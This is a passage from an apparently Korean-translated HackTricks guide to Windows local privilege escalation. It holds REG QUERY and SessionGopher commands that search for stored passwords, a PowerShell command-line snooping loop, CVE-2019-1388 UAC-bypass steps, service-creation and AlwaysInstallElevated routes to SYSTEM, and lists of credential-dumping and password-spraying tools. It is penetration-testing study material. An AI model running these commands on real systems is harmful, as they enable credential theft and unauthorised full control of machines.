다음은 레지스트리에서 키 이름과 비밀번호를 검색하는 방법입니다.

1. `regedit` 명령을 실행하여 레지스트리 편집기를 엽니다.
2. `HKEY_LOCAL_MACHINE` 또는 `HKEY_CURRENT_USER`와 같은 중요한 레지스트리 키로 이동합니다.
3. `Ctrl + F` 키를 눌러 검색 대화 상자를 엽니다.
4. 검색 대화 상자에 키 이름이나 비밀번호와 같은 검색어를 입력합니다.
5. 검색 결과에서 중요한 정보를 찾을 수 있습니다.

레지스트리에서 중요한 정보를 검색하는 것은 시스템 보안 취약점을 찾는 데 도움이 될 수 있습니다. 그러나 이 작업을 수행하기 전에 시스템에 대한 적절한 권한과 허가를 가지고 있는지 확인해야 합니다.
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 비밀번호를 검색하는 도구들

[**MSF-Credentials 플러그인**](https://github.com/carlospolop/MSF-Credentials)은 제가 만든 msf 플러그인입니다. 이 플러그인은 피해자 내에서 자격 증명을 검색하는 모든 metasploit POST 모듈을 자동으로 실행합니다.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)는 이 페이지에서 언급된 모든 비밀번호가 포함된 파일을 자동으로 검색합니다.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne)는 시스템에서 비밀번호를 추출하는 또 다른 훌륭한 도구입니다.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 도구는 PuTTY, WinSCP, FileZilla, SuperPuTTY 및 RDP와 같은 여러 도구에서 이 데이터를 평문으로 저장하는 세션, 사용자 이름 및 비밀번호를 검색합니다.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## 누출된 핸들러

**SYSTEM으로 실행되는 프로세스가 전체 액세스 권한으로 새 프로세스를 열고** (`OpenProcess()`) 동시에 **저작권한을 상속받은 저작권한이 있는 새 프로세스를 생성** (`CreateProcess()`)합니다.\
그런 다음, **저작권한이 있는 프로세스에 대한 열린 핸들을 얻을 수 있는 경우**, `OpenProcess()`로 생성된 **특권 프로세스에 쉘코드를 주입**할 수 있습니다.\
[이 취약점을 **탐지하고 악용하는 방법에 대한 자세한 내용은 이 예제를 참조하십시오**.](leaked-handle-exploitation.md)\
[**다른 게시물에서는 다른 수준의 권한으로 상속된 프로세스 및 스레드의 더 많은 열린 핸들을 테스트하고 악용하는 방법에 대해 자세히 설명합니다(전체 액세스만 아닌)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe 클라이언트 위장

**파이프**라고도 하는 공유 메모리 세그먼트는 프로세스 간 통신과 데이터 전송을 가능하게 합니다.

Windows는 **Named Pipes**라는 기능을 제공하여 관련 없는 프로세스가 데이터를 공유할 수 있도록 합니다. 이는 클라이언트/서버 아키텍처와 유사하며, **Named Pipe 서버**와 **Named Pipe 클라이언트**로 정의된 역할을 가지고 있습니다.

**클라이언트**가 파이프를 통해 데이터를 보낼 때, 파이프를 설정한 **서버**는 필요한 **SeImpersonate** 권한을 가지고 있다면 **클라이언트**의 **신원을 취할 수 있습니다**. 파이프를 통해 상호 작용하는 프로세스의 신원을 모방할 수 있는 **특권 프로세스**를 식별하면 해당 프로세스와 상호 작용할 때 해당 신원을 채택하여 **더 높은 권한을 얻을 수 있는 기회**가 생깁니다. 이러한 공격을 실행하는 방법에 대한 지침은 [**여기**](named-pipe-client-impersonation.md)와 [**여기**](./#from-high-integrity-to-system)에서 찾을 수 있습니다.

또한 다음 도구를 사용하면 **burp와 같은 도구로 Named Pipe 통신을 가로챌 수 있습니다:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **이 도구를 사용하면 모든 파이프를 나열하고 확인하여 권한 상승을 찾을 수 있습니다** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## 기타

### **비밀번호를 위한 명령 줄 모니터링**

사용자로서 쉘을 얻을 때, 실행되는 예약된 작업이나 다른 프로세스에서 **명령 줄을 통해 자격 증명을 전달**할 수 있습니다. 아래 스크립트는 프로세스 명령 줄을 매 2초마다 캡처하고 현재 상태와 이전 상태를 비교하여 차이가 있는 경우 출력합니다.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 낮은 권한 사용자에서 NT\AUTHORITY SYSTEM으로 (CVE-2019-1388) / UAC 우회

그래픽 인터페이스에 액세스할 수 있는 경우 (콘솔 또는 RDP를 통해) UAC가 활성화된 경우, Microsoft Windows의 일부 버전에서 권한이 없는 사용자로부터 터미널 또는 "NT\AUTHORITY SYSTEM"과 같은 다른 프로세스를 실행할 수 있습니다.

이를 통해 권한을 상승시키고 동시에 동일한 취약점을 통해 UAC를 우회할 수 있습니다. 또한, 아무것도 설치할 필요가 없으며, 프로세스 중에 사용되는 이진 파일은 Microsoft에 의해 서명되고 발급됩니다.

일부 영향을 받는 시스템은 다음과 같습니다:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
이 취약점을 악용하기 위해서는 다음 단계를 수행해야 합니다:

```
1) HHUPD.EXE 파일을 마우스 오른쪽 버튼으로 클릭하고 관리자 권한으로 실행합니다.

2) UAC 프롬프트가 나타나면 "자세한 정보 표시"를 선택합니다.

3) "발급자 인증서 정보 표시"를 클릭합니다.

4) 시스템이 취약하다면 "발급자" URL 링크를 클릭하면 기본 웹 브라우저가 나타날 수 있습니다.

5) 사이트가 완전히 로드될 때까지 기다리고 "다른 이름으로 저장"을 선택하여 explorer.exe 창을 띄웁니다.

6) explorer 창의 주소 경로에 cmd.exe, powershell.exe 또는 다른 대화형 프로세스를 입력합니다.

7) 이제 "NT\AUTHORITY SYSTEM" 명령 프롬프트를 얻을 수 있습니다.

8) 데스크톱으로 돌아가려면 설정 및 UAC 프롬프트를 취소하는 것을 잊지 마세요.
```

필요한 모든 파일과 정보는 다음 GitHub 저장소에서 찾을 수 있습니다:

https://github.com/jas502n/CVE-2019-1388

## 관리자 중간에서 고도의 무결성 수준으로 / UAC 우회

**무결성 수준에 대해 알아보려면** 이 문서를 읽으세요:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

그런 다음 **UAC와 UAC 우회에 대해 알아보려면** 이 문서를 읽으세요:

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## 고도의 무결성에서 시스템으로

### 새로운 서비스

이미 고도의 무결성 프로세스에서 실행 중인 경우, **새로운 서비스를 생성하고 실행**함으로써 **SYSTEM으로 전환**할 수 있습니다:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

고 인증 프로세스에서는 **AlwaysInstallElevated 레지스트리 항목을 활성화**하고 **.msi 래퍼**를 사용하여 역쉘을 **설치**할 수 있습니다.\
[관련된 레지스트리 키 및 .msi 패키지 설치에 대한 자세한 정보는 여기에서 확인하세요.](./#alwaysinstallelevated)

### High + SeImpersonate 권한을 System으로 변경

**여기에서 코드를 찾을 수 있습니다.** [**여기를 클릭하세요**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate에서 Full Token 권한으로 변경

이러한 토큰 권한을 가지고 있다면 (아마도 이미 고 인증 프로세스에서 찾을 수 있을 것입니다), SeDebug 권한으로 **거의 모든 프로세스** (보호되지 않은 프로세스 제외)를 **열 수 있으며**, 프로세스의 토큰을 **복사**하고 해당 토큰으로 **임의의 프로세스를 생성**할 수 있습니다.\
이 기술을 사용하면 일반적으로 **모든 토큰 권한을 가진 SYSTEM으로 실행 중인 프로세스를 선택**할 수 있습니다. (_네, 모든 토큰 권한을 가진 SYSTEM 프로세스를 찾을 수 있습니다._)\
**여기에서 제안된 기술을 실행하는 코드 예제를 찾을 수 있습니다.** [**여기를 클릭하세요**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

이 기술은 meterpreter가 `getsystem`에서 승격하는 데 사용됩니다. 이 기술은 **파이프를 생성한 다음 서비스를 생성/남용하여 해당 파이프에 쓰기**를 수행하는 것입니다. 그런 다음 **SeImpersonate** 권한을 사용하여 파이프 클라이언트 (서비스)의 토큰을 **가장할 수 있는 서버**는 SYSTEM 권한을 얻을 수 있습니다.\
[**명명된 파이프 클라이언트 가장하기에 대해 자세히 알아보려면 여기를 클릭하세요**](./#named-pipe-client-impersonation).\
[**고 인증에서 시스템으로 이동하는 방법에 대한 예제를 읽으려면 여기를 클릭하세요**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM으로 실행 중인 프로세스**에서 **로드되는 dll을 탈취**하면 해당 권한으로 임의의 코드를 실행할 수 있습니다. 따라서 Dll Hijacking은 이러한 권한 상승에도 유용하며, 더욱이 **고 인증 프로세스에서는 dll을 로드하는 데 사용되는 폴더에 쓰기 권한**이 있으므로 더욱 쉽게 달성할 수 있습니다.\
[**Dll hijacking에 대해 자세히 알아보려면 여기를 클릭하세요**](dll-hijacking.md)**.**

### **관리자 또는 Network Service에서 System으로**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### LOCAL SERVICE 또는 NETWORK SERVICE에서 전체 권한으로

**읽기:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 추가 도움

[정적 impacket 이진 파일](https://github.com/ropnop/impacket\_static\_binaries)

## 유용한 도구

**Windows 로컬 권한 상승 벡터를 찾는 가장 좋은 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 구성 오류 및 민감한 파일 확인 (**[**여기를 클릭하세요**](../../windows/windows-local-privilege-escalation/broken-reference/)**). 감지됨.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 일부 가능한 구성 오류 확인 및 정보 수집 (**[**여기를 클릭하세요**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 구성 오류 확인**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla 및 RDP 저장된 세션 정보 추출. 로컬에서 -Thorough 사용.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 자격 증명 관리자에서 자격 증명 추출. 감지됨.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 수집된 암호를 도메인 전체에 적용**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh는 PowerShell ADIDNS/LLMNR/mDNS/NBNS 스푸핑 및 중간자 도구입니다.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 기본적인 권한 상승 Windows 열거**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 알려진 권한 상승 취약점 검색 (Watson에 대해 DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 로컬 검사 **(관리자 권한 필요)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 알려진 권한 상승 취약점 검색 (VisualStudio를 사용하여 컴파일해야 함) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 구성 오류를 찾기 위해 호스트 열거 (권한 상승보다는 정보 수집 도구) (컴파일 필요) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 여러 소프트웨어에서 자격 증명 추출 (github에서 미리 컴파일된 exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- C#로 변환된 PowerUp**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 구성 오류 확인 (github에서 미리 컴파일된 실행 파일). 권장하지 않습니다. Win10에서 제대로 작동하지 않습니다.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 가능한 구성 오류 확인 (python의 exe). 권장하지 않습니다. Win10에서 제대로 작동하지 않습니다.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 이 게시물을 기반으로 만든 도구 (accesschk를 제대로 작동시키기 위해 필요하지 않지만 사용할 수 있음).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**의 출력을 읽고 작동하는 exploits을 추천합니다 (로컬 python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**의 출력을 읽고 작동하는 exploits을 추천합니다 (로컬 python)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

프로젝트를 올바른 .NET 버전을 사용하여 컴파일해야 합니다 ([여기를 참조하세요](https://rastamouse.me/2018/09/a-lesson-in-.
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 참고 자료

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **해킹 트릭을 공유하려면** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)에 PR을 제출하세요.

</details>
